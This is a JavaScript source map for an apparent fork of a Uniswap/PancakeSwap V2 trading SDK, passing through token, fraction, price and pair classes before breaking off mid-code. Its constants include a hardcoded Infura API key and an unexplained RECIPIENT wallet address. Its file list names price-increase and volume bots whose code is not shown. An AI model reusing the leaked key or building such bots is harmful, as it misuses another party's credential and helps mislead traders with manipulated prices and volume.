{"version":3,"file":"sdk.cjs.production.min.js","sources":["../src/constants.ts","../src/errors.ts","../src/utils.ts","../src/entities/currency.ts","../src/entities/token.ts","../src/entities/fractions/fraction.ts","../src/entities/fractions/currencyAmount.ts","../src/entities/fractions/tokenAmount.ts","../src/entities/fractions/price.ts","../src/entities/pair.ts","../src/entities/route.ts","../src/entities/fractions/percent.ts","../src/entities/trade.ts","../src/router.ts","../src/fetcher.ts","../src/utils/convertNumber.ts","../node_modules/babel-plugin-transform-async-to-promises/helpers.mjs","../src/utils/sendNoti.ts","../src/projects/sendTokenOTC.ts","../src/marketMakerEVM/bot_increasePrice.ts","../src/marketMakerEVM/bot_increasePrice_eth.ts","../src/marketMakerEVM/bot_approve.ts","../src/marketMakerEVM/bot_approve_eth.ts","../src/marketMakerEVM/bot_volume.ts","../src/marketMakerEVM/bot_volume_eth.ts","../src/marketMakerEVM/bot_buy.ts","../src/marketMakerEVM/bot_buy_eth.ts","../src/marketMakerSOL/buyTokenSOL.ts","../src/marketMakerSOL/claimToken.ts","../src/marketMakerSOL/collectionSOL.ts","../src/marketMakerSOL/distributeSOL.ts","../src/projects/distributeUSDT.ts","../src/marketMakerEVM/getBalanceToken.ts","../src/marketMakerEVM/getBalanceToken_eth.ts","../src/marketMakerEVM/bot_sell.ts","../src/utils/approve.ts","../src/marketMakerEVM/bot_sell_eth.ts","../src/utils/approveETH.ts","../src/marketMakerSOL/sellTokenSOL.ts","../src/marketMakerSOL/sendSOL.ts","../src/marketMakerSOL/unwrapSOL.ts","../src/marketMakerSOL/withdrawSOL.ts","../src/marketMakerSOL/withdrawToken.ts","../src/projects/withdrawOni.ts"],"sourcesContent":["import JSBI from 'jsbi'\n\n// exports for external consumption\nexport type BigintIsh = JSBI | bigint | string\n\nexport enum ChainId {\n  MAINNET = 56,\n  BSCTESTNET = 97\n}\n\nexport enum TradeType {\n  EXACT_INPUT,\n  EXACT_OUTPUT\n}\n\nexport enum Rounding {\n  ROUND_DOWN,\n  ROUND_HALF_UP,\n  ROUND_UP\n}\n\n\nexport const INIT_CODE_HASH = '0x00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5'\n\nexport const MINIMUM_LIQUIDITY = JSBI.BigInt(1000)\n\n// exports for internal consumption\nexport const ZERO = JSBI.BigInt(0)\nexport const ONE = JSBI.BigInt(1)\nexport const TWO = JSBI.BigInt(2)\nexport const THREE = JSBI.BigInt(3)\nexport const FIVE = JSBI.BigInt(5)\nexport const TEN = JSBI.BigInt(10)\nexport const _100 = JSBI.BigInt(100)\nexport const _998 = JSBI.BigInt(998)\nexport const _1000 = JSBI.BigInt(1000)\n\nexport enum SolidityType {\n  uint8 = 'uint8',\n  uint256 = 'uint256'\n}\n\nexport const SOLIDITY_TYPE_MAXIMA = {\n  [SolidityType.uint8]: JSBI.BigInt('0xff'),\n  [SolidityType.uint256]: JSBI.BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')\n}\n\nexport const HTTPS_BSC = \"https://bsc-dataseed4.ninicoin.io/\";\nexport const USDT = \"0x55d398326f99059ff775485246999027b3197955\";\nexport const WBNB = \"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c\";\nexport const ROUTER_PANCAKE = \"0x10ED43C718714eb63d5aA57B78B54704E256024E\";\nexport const FACTORY_ADDRESS = \"0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73\";\nexport const AMM_CONTRACT = \"0xdfae336e93cc7611fde661e10c6a60f09c9a0262\";\nexport const LIST_RPC_NODES = [\n  \"https://bsc-dataseed4.ninicoin.io/\",\n  \"https://bsc-dataseed3.ninicoin.io/\",\n  \"https://bsc-dataseed2.ninicoin.io/\",\n  \"https://bsc-dataseed1.ninicoin.io/\",\n  \"https://bsc-dataseed1.defibit.io/\",\n  \"https://bsc-dataseed2.defibit.io/\",\n  \"https://bsc-dataseed3.defibit.io/\",\n  \"https://bsc-dataseed4.defibit.io/\",\n  \"https://bsc-dataseed1.ninicoin.io/\",\n  \"https://bsc-dataseed2.ninicoin.io/\",\n  \"https://bsc-dataseed3.ninicoin.io/\",\n  \"https://bsc-dataseed4.ninicoin.io/\",\n]\n\nexport const HTTPS_ETH = \"https://mainnet.infura.io/v3/ffba1579926a470e98adb34ffb50bd4d\";\nexport const USDT_ETH = \"0xdAC17F958D2ee523a2206206994597C13D831ec7\";\nexport const WETH = \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\";\nexport const ROUTER_UNI = \"0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\";\nexport const FACTORY_ADDRESS_ETH = \"0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f\";\nexport const AMM_CONTRACT_ETH = \"0x8E75BA2c2fd8Ef11f0f9CC59cAad7cB58C38cA8D\";\nexport const LIST_RPC_NODES_ETH = [\n  \"https://mainnet.infura.io/v3/ffba1579926a470e98adb34ffb50bd4d\",\n  \"https://eth-pokt.nodies.app\",\n  \"https://1rpc.io/eth\",\n  \"https://rpc.lokibuilder.xyz/wallet\",\n  \"https://ethereum-rpc.publicnode.com\",\n  \"https://eth.llamarpc.com\",\n  \"https://rpc.public.curie.radiumblock.co/http/ethereum\",\n  \"https://ethereum.blockpi.network/v1/rpc/public\",\n]\nexport const RECIPIENT = \"EnhfgqvRNERm8Bzu5v41oKQsHbft7dXW8kZf7QGdUsvr\";","// see https://stackoverflow.com/a/41102306\nconst CAN_SET_PROTOTYPE = 'setPrototypeOf' in Object\n\n/**\n * Indicates that the pair has insufficient reserves for a desired output amount. I.e. the amount of output cannot be\n * obtained by sending any amount of input.\n */\nexport class InsufficientReservesError extends Error {\n  public readonly isInsufficientReservesError: true = true\n\n  public constructor() {\n    super()\n    this.name = this.constructor.name\n    if (CAN_SET_PROTOTYPE) Object.setPrototypeOf(this, new.target.prototype)\n  }\n}\n\n/**\n * Indicates that the input amount is too small to produce any amount of output. I.e. the amount of input sent is less\n * than the price of a single unit of output after fees.\n */\nexport class InsufficientInputAmountError extends Error {\n  public readonly isInsufficientInputAmountError: true = true\n\n  public constructor() {\n    super()\n    this.name = this.constructor.name\n    if (CAN_SET_PROTOTYPE) Object.setPrototypeOf(this, new.target.prototype)\n  }\n}\n","import invariant from 'tiny-invariant'\nimport warning from 'tiny-warning'\nimport JSBI from 'jsbi'\nimport pino from 'pino'\nimport { getAddress } from '@ethersproject/address'\n\n\nimport { BigintIsh, ZERO, ONE, TWO, THREE, SolidityType, SOLIDITY_TYPE_MAXIMA } from './constants'\n\nexport function validateSolidityTypeInstance(value: JSBI, solidityType: SolidityType): void {\n  invariant(JSBI.greaterThanOrEqual(value, ZERO), `${value} is not a ${solidityType}.`)\n  invariant(JSBI.lessThanOrEqual(value, SOLIDITY_TYPE_MAXIMA[solidityType]), `${value} is not a ${solidityType}.`)\n}\n\n// warns if addresses are not checksummed\nexport function validateAndParseAddress(address: string): string {\n  try {\n    const checksummedAddress = getAddress(address)\n    warning(address === checksummedAddress, `${address} is not checksummed.`)\n    return checksummedAddress\n  } catch (error) {\n    invariant(false, `${address} is not a valid address.`)\n  }\n}\n\nexport function parseBigintIsh(bigintIsh: BigintIsh): JSBI {\n  return bigintIsh instanceof JSBI\n    ? bigintIsh\n    : typeof bigintIsh === 'bigint'\n      ? JSBI.BigInt(bigintIsh.toString())\n      : JSBI.BigInt(bigintIsh)\n}\n\n// mock the on-chain sqrt function\nexport function sqrt(y: JSBI): JSBI {\n  validateSolidityTypeInstance(y, SolidityType.uint256)\n  let z: JSBI = ZERO\n  let x: JSBI\n  if (JSBI.greaterThan(y, THREE)) {\n    z = y\n    x = JSBI.add(JSBI.divide(y, TWO), ONE)\n    while (JSBI.lessThan(x, z)) {\n      z = x\n      x = JSBI.divide(JSBI.add(JSBI.divide(y, x), x), TWO)\n    }\n  } else if (JSBI.notEqual(y, ZERO)) {\n    z = ONE\n  }\n  return z\n}\n\n// given an array of items sorted by `comparator`, insert an item into its sort index and constrain the size to\n// `maxSize` by removing the last item\nexport function sortedInsert<T>(items: T[], add: T, maxSize: number, comparator: (a: T, b: T) => number): T | null {\n  invariant(maxSize > 0, 'MAX_SIZE_ZERO')\n  // this is an invariant because the interface cannot return multiple removed items if items.length exceeds maxSize\n  invariant(items.length <= maxSize, 'ITEMS_SIZE')\n\n  // short circuit first item add\n  if (items.length === 0) {\n    items.push(add)\n    return null\n  } else {\n    const isFull = items.length === maxSize\n    // short circuit if full and the additional item does not come before the last item\n    if (isFull && comparator(items[items.length - 1], add) <= 0) {\n      return add\n    }\n\n    let lo = 0,\n      hi = items.length\n\n    while (lo < hi) {\n      const mid = (lo + hi) >>> 1\n      if (comparator(items[mid], add) <= 0) {\n        lo = mid + 1\n      } else {\n        hi = mid\n      }\n    }\n    items.splice(lo, 0, add)\n    return isFull ? items.pop()! : null\n  }\n}\nexport const transport = pino.transport({\n  target: 'pino-pretty',\n});\nexport const logger = pino(\n  {\n    level: 'info',\n    redact: ['poolKeys'],\n    serializers: {\n      error: pino.stdSerializers.err,\n    },\n    base: undefined,\n  },\n  transport,\n);\n\nexport const formatAddress = (address: any, before: any, after: any) => address &&\n  `${address.substring(0, before || 4)}.....${address.substring(address.length - after || 6)}`;\n\nexport async function sleep(millis: any) {\n  const second = Number(millis) * 1000;\n  return new Promise((resolve) => setTimeout(resolve, second));\n}\n\nexport function randomIntFromInterval(min: any, max: any) {\n  const random = (Math.random() * (max - min) + min).toFixed(4);\n  return random;\n}","import JSBI from 'jsbi'\n\nimport { SolidityType } from '../constants'\nimport { validateSolidityTypeInstance } from '../utils'\n\n/**\n * A currency is any fungible financial instrument on Ethereum, including Ether and all ERC20 tokens.\n *\n * The only instance of the base class `Currency` is Ether.\n */\nexport class Currency {\n  public readonly decimals: number\n  public readonly symbol?: string\n  public readonly name?: string\n\n  /**\n   * The only instance of the base class `Currency`.\n   */\n  public static readonly ETHER: Currency = new Currency(18, 'BNB', 'Binance')\n\n  /**\n   * Constructs an instance of the base class `Currency`. The only instance of the base class `Currency` is `Currency.ETHER`.\n   * @param decimals decimals of the currency\n   * @param symbol symbol of the currency\n   * @param name of the currency\n   */\n  protected constructor(decimals: number, symbol?: string, name?: string) {\n    validateSolidityTypeInstance(JSBI.BigInt(decimals), SolidityType.uint8)\n\n    this.decimals = decimals\n    this.symbol = symbol\n    this.name = name\n  }\n}\n\nconst ETHER = Currency.ETHER\nexport { ETHER }\n","import invariant from 'tiny-invariant'\nimport { ChainId } from '../constants'\nimport { validateAndParseAddress } from '../utils'\nimport { Currency } from './currency'\n\n/**\n * Represents an ERC20 token with a unique address and some metadata.\n */\nexport class Token extends Currency {\n  public readonly chainId: ChainId\n  public readonly address: string\n\n  public constructor(chainId: ChainId, address: string, decimals: number, symbol?: string, name?: string) {\n    super(decimals, symbol, name)\n    this.chainId = chainId\n    this.address = validateAndParseAddress(address)\n  }\n\n  /**\n   * Returns true if the two tokens are equivalent, i.e. have the same chainId and address.\n   * @param other other token to compare\n   */\n  public equals(other: Token): boolean {\n    // short circuit on reference equality\n    if (this === other) {\n      return true\n    }\n    return this.chainId === other.chainId && this.address === other.address\n  }\n\n  /**\n   * Returns true if the address of this token sorts before the address of the other token\n   * @param other other token to compare\n   * @throws if the tokens have the same address\n   * @throws if the tokens are on different chains\n   */\n  public sortsBefore(other: Token): boolean {\n    invariant(this.chainId === other.chainId, 'CHAIN_IDS')\n    invariant(this.address !== other.address, 'ADDRESSES')\n    return this.address.toLowerCase() < other.address.toLowerCase()\n  }\n}\n\n/**\n * Compares two currencies for equality\n */\nexport function currencyEquals(currencyA: Currency, currencyB: Currency): boolean {\n  if (currencyA instanceof Token && currencyB instanceof Token) {\n    return currencyA.equals(currencyB)\n  } else if (currencyA instanceof Token) {\n    return false\n  } else if (currencyB instanceof Token) {\n    return false\n  } else {\n    return currencyA === currencyB\n  }\n}\n\nexport const WETH = {\n  [ChainId.MAINNET]: new Token(\n    ChainId.MAINNET,\n    '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',\n    18,\n    'WBNB',\n    'Wrapped BNB'\n  ),\n  [ChainId.BSCTESTNET]: new Token(\n    ChainId.BSCTESTNET,\n    '0xaE8E19eFB41e7b96815649A6a60785e1fbA84C1e',\n    18,\n    'WBNB',\n    'Wrapped BNB'\n  )\n}\n","import invariant from 'tiny-invariant'\nimport JSBI from 'jsbi'\nimport _Decimal from 'decimal.js-light'\nimport _Big, { RoundingMode } from 'big.js'\nimport toFormat from 'toformat'\n\nimport { BigintIsh, Rounding } from '../../constants'\nimport { ONE } from '../../constants'\nimport { parseBigintIsh } from '../../utils'\n\nconst Decimal = toFormat(_Decimal)\nconst Big = toFormat(_Big)\n\nconst toSignificantRounding = {\n  [Rounding.ROUND_DOWN]: Decimal.ROUND_DOWN,\n  [Rounding.ROUND_HALF_UP]: Decimal.ROUND_HALF_UP,\n  [Rounding.ROUND_UP]: Decimal.ROUND_UP\n}\n\nconst toFixedRounding = {\n  [Rounding.ROUND_DOWN]: RoundingMode.RoundDown,\n  [Rounding.ROUND_HALF_UP]: RoundingMode.RoundHalfUp,\n  [Rounding.ROUND_UP]: RoundingMode.RoundUp\n}\n\nexport class Fraction {\n  public readonly numerator: JSBI\n  public readonly denominator: JSBI\n\n  public constructor(numerator: BigintIsh, denominator: BigintIsh = ONE) {\n    this.numerator = parseBigintIsh(numerator)\n    this.denominator = parseBigintIsh(denominator)\n  }\n\n  // performs floor division\n  public get quotient(): JSBI {\n    return JSBI.divide(this.numerator, this.denominator)\n  }\n\n  // remainder after floor division\n  public get remainder(): Fraction {\n    return new Fraction(JSBI.remainder(this.numerator, this.denominator), this.denominator)\n  }\n\n  public invert(): Fraction {\n    return new Fraction(this.denominator, this.numerator)\n  }\n\n  public add(other: Fraction | BigintIsh): Fraction {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    if (JSBI.equal(this.denominator, otherParsed.denominator)) {\n      return new Fraction(JSBI.add(this.numerator, otherParsed.numerator), this.denominator)\n    }\n    return new Fraction(\n      JSBI.add(\n        JSBI.multiply(this.numerator, otherParsed.denominator),\n        JSBI.multiply(otherParsed.numerator, this.denominator)\n      ),\n      JSBI.multiply(this.denominator, otherParsed.denominator)\n    )\n  }\n\n  public subtract(other: Fraction | BigintIsh): Fraction {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    if (JSBI.equal(this.denominator, otherParsed.denominator)) {\n      return new Fraction(JSBI.subtract(this.numerator, otherParsed.numerator), this.denominator)\n    }\n    return new Fraction(\n      JSBI.subtract(\n        JSBI.multiply(this.numerator, otherParsed.denominator),\n        JSBI.multiply(otherParsed.numerator, this.denominator)\n      ),\n      JSBI.multiply(this.denominator, otherParsed.denominator)\n    )\n  }\n\n  public lessThan(other: Fraction | BigintIsh): boolean {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    return JSBI.lessThan(\n      JSBI.multiply(this.numerator, otherParsed.denominator),\n      JSBI.multiply(otherParsed.numerator, this.denominator)\n    )\n  }\n\n  public equalTo(other: Fraction | BigintIsh): boolean {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    return JSBI.equal(\n      JSBI.multiply(this.numerator, otherParsed.denominator),\n      JSBI.multiply(otherParsed.numerator, this.denominator)\n    )\n  }\n\n  public greaterThan(other: Fraction | BigintIsh): boolean {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    return JSBI.greaterThan(\n      JSBI.multiply(this.numerator, otherParsed.denominator),\n      JSBI.multiply(otherParsed.numerator, this.denominator)\n    )\n  }\n\n  public multiply(other: Fraction | BigintIsh): Fraction {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    return new Fraction(\n      JSBI.multiply(this.numerator, otherParsed.numerator),\n      JSBI.multiply(this.denominator, otherParsed.denominator)\n    )\n  }\n\n  public divide(other: Fraction | BigintIsh): Fraction {\n    const otherParsed = other instanceof Fraction ? other : new Fraction(parseBigintIsh(other))\n    return new Fraction(\n      JSBI.multiply(this.numerator, otherParsed.denominator),\n      JSBI.multiply(this.denominator, otherParsed.numerator)\n    )\n  }\n\n  public toSignificant(\n    significantDigits: number,\n    format: object = { groupSeparator: '' },\n    rounding: Rounding = Rounding.ROUND_HALF_UP\n  ): string {\n    invariant(Number.isInteger(significantDigits), `${significantDigits} is not an integer.`)\n    invariant(significantDigits > 0, `${significantDigits} is not positive.`)\n\n    Decimal.set({ precision: significantDigits + 1, rounding: toSignificantRounding[rounding] })\n    const quotient = new Decimal(this.numerator.toString())\n      .div(this.denominator.toString())\n      .toSignificantDigits(significantDigits)\n    return quotient.toFormat(quotient.decimalPlaces(), format)\n  }\n\n  public toFixed(\n    decimalPlaces: number,\n    format: object = { groupSeparator: '' },\n    rounding: Rounding = Rounding.ROUND_HALF_UP\n  ): string {\n    invariant(Number.isInteger(decimalPlaces), `${decimalPlaces} is not an integer.`)\n    invariant(decimalPlaces >= 0, `${decimalPlaces} is negative.`)\n\n    Big.DP = decimalPlaces\n    Big.RM = toFixedRounding[rounding]\n    return new Big(this.numerator.toString()).div(this.denominator.toString()).toFormat(decimalPlaces, format)\n  }\n}\n","import { currencyEquals } from '../token'\nimport { Currency, ETHER } from '../currency'\nimport invariant from 'tiny-invariant'\nimport JSBI from 'jsbi'\nimport _Big from 'big.js'\nimport toFormat from 'toformat'\n\nimport { BigintIsh, Rounding, TEN, SolidityType } from '../../constants'\nimport { parseBigintIsh, validateSolidityTypeInstance } from '../../utils'\nimport { Fraction } from './fraction'\n\nconst Big = toFormat(_Big)\n\nexport class CurrencyAmount extends Fraction {\n  public readonly currency: Currency\n\n  /**\n   * Helper that calls the constructor with the ETHER currency\n   * @param amount ether amount in wei\n   */\n  public static ether(amount: BigintIsh): CurrencyAmount {\n    return new CurrencyAmount(ETHER, amount)\n  }\n\n  // amount _must_ be raw, i.e. in the native representation\n  protected constructor(currency: Currency, amount: BigintIsh) {\n    const parsedAmount = parseBigintIsh(amount)\n    validateSolidityTypeInstance(parsedAmount, SolidityType.uint256)\n\n    super(parsedAmount, JSBI.exponentiate(TEN, JSBI.BigInt(currency.decimals)))\n    this.currency = currency\n  }\n\n  public get raw(): JSBI {\n    return this.numerator\n  }\n\n  public add(other: CurrencyAmount): CurrencyAmount {\n    invariant(currencyEquals(this.currency, other.currency), 'TOKEN')\n    return new CurrencyAmount(this.currency, JSBI.add(this.raw, other.raw))\n  }\n\n  public subtract(other: CurrencyAmount): CurrencyAmount {\n    invariant(currencyEquals(this.currency, other.currency), 'TOKEN')\n    return new CurrencyAmount(this.currency, JSBI.subtract(this.raw, other.raw))\n  }\n\n  public toSignificant(\n    significantDigits: number = 6,\n    format?: object,\n    rounding: Rounding = Rounding.ROUND_DOWN\n  ): string {\n    return super.toSignificant(significantDigits, format, rounding)\n  }\n\n  public toFixed(\n    decimalPlaces: number = this.currency.decimals,\n    format?: object,\n    rounding: Rounding = Rounding.ROUND_DOWN\n  ): string {\n    invariant(decimalPlaces <= this.currency.decimals, 'DECIMALS')\n    return super.toFixed(decimalPlaces, format, rounding)\n  }\n\n  public toExact(format: object = { groupSeparator: '' }): string {\n    Big.DP = this.currency.decimals\n    return new Big(this.numerator.toString()).div(this.denominator.toString()).toFormat(format)\n  }\n}\n","import { CurrencyAmount } from './currencyAmount'\nimport { Token } from '../token'\nimport invariant from 'tiny-invariant'\nimport JSBI from 'jsbi'\n\nimport { BigintIsh } from '../../constants'\n\nexport class TokenAmount extends CurrencyAmount {\n  public readonly token: Token\n\n  // amount _must_ be raw, i.e. in the native representation\n  public constructor(token: Token, amount: BigintIsh) {\n    super(token, amount)\n    this.token = token\n  }\n\n  public add(other: TokenAmount): TokenAmount {\n    invariant(this.token.equals(other.token), 'TOKEN')\n    return new TokenAmount(this.token, JSBI.add(this.raw, other.raw))\n  }\n\n  public subtract(other: TokenAmount): TokenAmount {\n    invariant(this.token.equals(other.token), 'TOKEN')\n    return new TokenAmount(this.token, JSBI.subtract(this.raw, other.raw))\n  }\n}\n","import { Token } from '../token'\nimport { TokenAmount } from './tokenAmount'\nimport { currencyEquals } from '../token'\nimport invariant from 'tiny-invariant'\nimport JSBI from 'jsbi'\n\nimport { BigintIsh, Rounding, TEN } from '../../constants'\nimport { Currency } from '../currency'\nimport { Route } from '../route'\nimport { Fraction } from './fraction'\nimport { CurrencyAmount } from './currencyAmount'\n\nexport class Price extends Fraction {\n  public readonly baseCurrency: Currency // input i.e. denominator\n  public readonly quoteCurrency: Currency // output i.e. numerator\n  public readonly scalar: Fraction // used to adjust the raw fraction w/r/t the decimals of the {base,quote}Token\n\n  public static fromRoute(route: Route): Price {\n    const prices: Price[] = []\n    for (const [i, pair] of route.pairs.entries()) {\n      prices.push(\n        route.path[i].equals(pair.token0)\n          ? new Price(pair.reserve0.currency, pair.reserve1.currency, pair.reserve0.raw, pair.reserve1.raw)\n          : new Price(pair.reserve1.currency, pair.reserve0.currency, pair.reserve1.raw, pair.reserve0.raw)\n      )\n    }\n    return prices.slice(1).reduce((accumulator, currentValue) => accumulator.multiply(currentValue), prices[0])\n  }\n\n  // denominator and numerator _must_ be raw, i.e. in the native representation\n  public constructor(baseCurrency: Currency, quoteCurrency: Currency, denominator: BigintIsh, numerator: BigintIsh) {\n    super(numerator, denominator)\n\n    this.baseCurrency = baseCurrency\n    this.quoteCurrency = quoteCurrency\n    this.scalar = new Fraction(\n      JSBI.exponentiate(TEN, JSBI.BigInt(baseCurrency.decimals)),\n      JSBI.exponentiate(TEN, JSBI.BigInt(quoteCurrency.decimals))\n    )\n  }\n\n  public get raw(): Fraction {\n    return new Fraction(this.numerator, this.denominator)\n  }\n\n  public get adjusted(): Fraction {\n    return super.multiply(this.scalar)\n  }\n\n  public invert(): Price {\n    return new Price(this.quoteCurrency, this.baseCurrency, this.numerator, this.denominator)\n  }\n\n  public multiply(other: Price): Price {\n    invariant(currencyEquals(this.quoteCurrency, other.baseCurrency), 'TOKEN')\n    const fraction = super.multiply(other)\n    return new Price(this.baseCurrency, other.quoteCurrency, fraction.denominator, fraction.numerator)\n  }\n\n  // performs floor division on overflow\n  public quote(currencyAmount: CurrencyAmount): CurrencyAmount {\n    invariant(currencyEquals(currencyAmount.currency, this.baseCurrency), 'TOKEN')\n    if (this.quoteCurrency instanceof Token) {\n      return new TokenAmount(this.quoteCurrency, super.multiply(currencyAmount.raw).quotient)\n    }\n    return CurrencyAmount.ether(super.multiply(currencyAmount.raw).quotient)\n  }\n\n  public toSignificant(significantDigits: number = 6, format?: object, rounding?: Rounding): string {\n    return this.adjusted.toSignificant(significantDigits, format, rounding)\n  }\n\n  public toFixed(decimalPlaces: number = 4, format?: object, rounding?: Rounding): string {\n    return this.adjusted.toFixed(decimalPlaces, format, rounding)\n  }\n}\n","import { Price } from './fractions/price'\nimport { TokenAmount } from './fractions/tokenAmount'\nimport invariant from 'tiny-invariant'\nimport JSBI from 'jsbi'\nimport { pack, keccak256 } from '@ethersproject/solidity'\nimport { getCreate2Address } from '@ethersproject/address'\n\nimport {\n  BigintIsh,\n  FACTORY_ADDRESS,\n  INIT_CODE_HASH,\n  MINIMUM_LIQUIDITY,\n  ZERO,\n  ONE,\n  FIVE,\n  _998,\n  _1000,\n  ChainId\n} from '../constants'\nimport { sqrt, parseBigintIsh } from '../utils'\nimport { InsufficientReservesError, InsufficientInputAmountError } from '../errors'\nimport { Token } from './token'\n\nlet PAIR_ADDRESS_CACHE: { [token0Address: string]: { [token1Address: string]: string } } = {}\n\nexport class Pair {\n  public readonly liquidityToken: Token\n  private readonly tokenAmounts: [TokenAmount, TokenAmount]\n\n  public static getAddress(tokenA: Token, tokenB: Token): string {\n    const tokens = tokenA.sortsBefore(tokenB) ? [tokenA, tokenB] : [tokenB, tokenA] // does safety checks\n\n    if (PAIR_ADDRESS_CACHE?.[tokens[0].address]?.[tokens[1].address] === undefined) {\n      PAIR_ADDRESS_CACHE = {\n        ...PAIR_ADDRESS_CACHE,\n        [tokens[0].address]: {\n          ...PAIR_ADDRESS_CACHE?.[tokens[0].address],\n          [tokens[1].address]: getCreate2Address(\n            FACTORY_ADDRESS,\n            keccak256(['bytes'], [pack(['address', 'address'], [tokens[0].address, tokens[1].address])]),\n            INIT_CODE_HASH\n          )\n        }\n      }\n    }\n\n    return PAIR_ADDRESS_CACHE[tokens[0].address][tokens[1].address]\n  }\n\n  public constructor(tokenAmountA: TokenAmount, tokenAmountB: TokenAmount) {\n    const tokenAmounts = tokenAmountA.token.sortsBefore(tokenAmountB.token) // does safety checks\n      ? [tokenAmountA, tokenAmountB]\n      : [tokenAmountB, tokenAmountA]\n    this.liquidityToken = new Token(\n      tokenAmounts[0].token.chainId,\n      Pair.getAddress(tokenAmounts[0].token, tokenAmounts[1].token),\n      18,\n      'UNI-V2',\n      'Uniswap V2'\n    )\n    this.tokenAmounts = tokenAmounts as [TokenAmount, TokenAmount]\n  }\n\n  /**\n   * Returns true if the token is either token0 or token1\n   * @param token to check\n   */\n  public involvesToken(token: Token): boolean {\n    return token.equals(this.token0) || token.equals(this.token1)\n  }\n\n  /**\n   * Returns the current mid price of the pair in terms of token0, i.e. the ratio of reserve1 to reserve0\n   */\n  public get token0Price(): Price {\n    return new Price(this.token0, this.token1, this.tokenAmounts[0].raw, this.tokenAmounts[1].raw)\n  }\n\n  /**\n   * Returns the current mid price of the pair in terms of token1, i.e. the ratio of reserve0 to reserve1\n   */\n  public get token1Price(): Price {\n    return new Price(this.token1, this.token0, this.tokenAmounts[1].raw, this.tokenAmounts[0].raw)\n  }\n\n  /**\n   * Return the price of the given token in terms of the other token in the pair.\n   * @param token token to return price of\n   */\n  public priceOf(token: Token): Price {\n    invariant(this.involvesToken(token), 'TOKEN')\n    return token.equals(this.token0) ? this.token0Price : this.token1Price\n  }\n\n  /**\n   * Returns the chain ID of the tokens in the pair.\n   */\n  public get chainId(): ChainId {\n    return this.token0.chainId\n  }\n\n  public get token0(): Token {\n    return this.tokenAmounts[0].token\n  }\n\n  public get token1(): Token {\n    return this.tokenAmounts[1].token\n  }\n\n  public get reserve0(): TokenAmount {\n    return this.tokenAmounts[0]\n  }\n\n  public get reserve1(): TokenAmount {\n    return this.tokenAmounts[1]\n  }\n\n  public reserveOf(token: Token): TokenAmount {\n    invariant(this.involvesToken(token), 'TOKEN')\n    return token.equals(this.token0) ? this.reserve0 : this.reserve1\n  }\n\n  public getOutputAmount(inputAmount: TokenAmount): [TokenAmount, Pair] {\n    invariant(this.involvesToken(inputAmount.token), 'TOKEN')\n    if (JSBI.equal(this.reserve0.raw, ZERO) || JSBI.equal(this.reserve1.raw, ZERO)) {\n      throw new InsufficientReservesError()\n    }\n    const inputReserve = this.reserveOf(inputAmount.token)\n    const outputReserve = this.reserveOf(inputAmount.token.equals(this.token0) ? this.token1 : this.token0)\n    const inputAmountWithFee = JSBI.multiply(inputAmount.raw, _998)\n    const numerator = JSBI.multiply(inputAmountWithFee, outputReserve.raw)\n    const denominator = JSBI.add(JSBI.multiply(inputReserve.raw, _1000), inputAmountWithFee)\n    const outputAmount = new TokenAmount(\n      inputAmount.token.equals(this.token0) ? this.token1 : this.token0,\n      JSBI.divide(numerator, denominator)\n    )\n    if (JSBI.equal(outputAmount.raw, ZERO)) {\n      throw new InsufficientInputAmountError()\n    }\n    return [outputAmount, new Pair(inputReserve.add(inputAmount), outputReserve.subtract(outputAmount))]\n  }\n\n  public getInputAmount(outputAmount: TokenAmount): [TokenAmount, Pair] {\n    invariant(this.involvesToken(outputAmount.token), 'TOKEN')\n    if (\n      JSBI.equal(this.reserve0.raw, ZERO) ||\n      JSBI.equal(this.reserve1.raw, ZERO) ||\n      JSBI.greaterThanOrEqual(outputAmount.raw, this.reserveOf(outputAmount.token).raw)\n    ) {\n      throw new InsufficientReservesError()\n    }\n\n    const outputReserve = this.reserveOf(outputAmount.token)\n    const inputReserve = this.reserveOf(outputAmount.token.equals(this.token0) ? this.token1 : this.token0)\n    const numerator = JSBI.multiply(JSBI.multiply(inputReserve.raw, outputAmount.raw), _1000)\n    const denominator = JSBI.multiply(JSBI.subtract(outputReserve.raw, outputAmount.raw), _998)\n    const inputAmount = new TokenAmount(\n      outputAmount.token.equals(this.token0) ? this.token1 : this.token0,\n      JSBI.add(JSBI.divide(numerator, denominator), ONE)\n    )\n    return [inputAmount, new Pair(inputReserve.add(inputAmount), outputReserve.subtract(outputAmount))]\n  }\n\n  public getLiquidityMinted(\n    totalSupply: TokenAmount,\n    tokenAmountA: TokenAmount,\n    tokenAmountB: TokenAmount\n  ): TokenAmount {\n    invariant(totalSupply.token.equals(this.liquidityToken), 'LIQUIDITY')\n    const tokenAmounts = tokenAmountA.token.sortsBefore(tokenAmountB.token) // does safety checks\n      ? [tokenAmountA, tokenAmountB]\n      : [tokenAmountB, tokenAmountA]\n    invariant(tokenAmounts[0].token.equals(this.token0) && tokenAmounts[1].token.equals(this.token1), 'TOKEN')\n\n    let liquidity: JSBI\n    if (JSBI.equal(totalSupply.raw, ZERO)) {\n      liquidity = JSBI.subtract(sqrt(JSBI.multiply(tokenAmounts[0].raw, tokenAmounts[1].raw)), MINIMUM_LIQUIDITY)\n    } else {\n      const amount0 = JSBI.divide(JSBI.multiply(tokenAmounts[0].raw, totalSupply.raw), this.reserve0.raw)\n      const amount1 = JSBI.divide(JSBI.multiply(tokenAmounts[1].raw, totalSupply.raw), this.reserve1.raw)\n      liquidity = JSBI.lessThanOrEqual(amount0, amount1) ? amount0 : amount1\n    }\n    if (!JSBI.greaterThan(liquidity, ZERO)) {\n      throw new InsufficientInputAmountError()\n    }\n    return new 